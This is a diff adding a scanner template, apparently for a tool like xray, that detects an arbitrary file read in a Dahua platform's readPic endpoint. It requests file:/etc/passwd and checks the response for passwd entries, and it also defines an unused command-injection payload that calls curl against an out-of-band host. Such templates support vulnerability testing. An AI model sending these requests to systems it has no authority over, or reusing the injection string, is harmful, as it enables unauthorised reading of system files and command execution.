@@ -1,0 +1,50 @@
+id: dahua-wulian-readPic-file-read
+info:
+  name: dahua-wulian-readPic-file-read
+  severity: critical
+  author: 
+
+set:
+  oob: oob()
+  oobHTTP: oob.HTTP
+  oobDNS: oob.DNS
+  baseurl: request.url
+  rboundary: randomInt(800000000, 1000000000)
+  s1: randomLowercase(8)
+  payload: base64("\';curl " + oobHTTP + " %23")
+  base64payload: base64Decode("123456")
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept-Encoding: gzip
+      body:
+      
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+
+    output:
+      search: |-
+        "(?P<rfile>\\w+.jsp)".bsubmatch(response.body)
+      rfile: search["rfile"]
+      search1: |-
+        "(?P<rdir>ico.*jsp)".bsubmatch(response.body)
+      rdir: search["rdir"]
+
+  r1:
+    request:
+      method: GET
+      path: /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Accept-Encoding: gzip
+      body:
+      
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+
+expression: r0() 
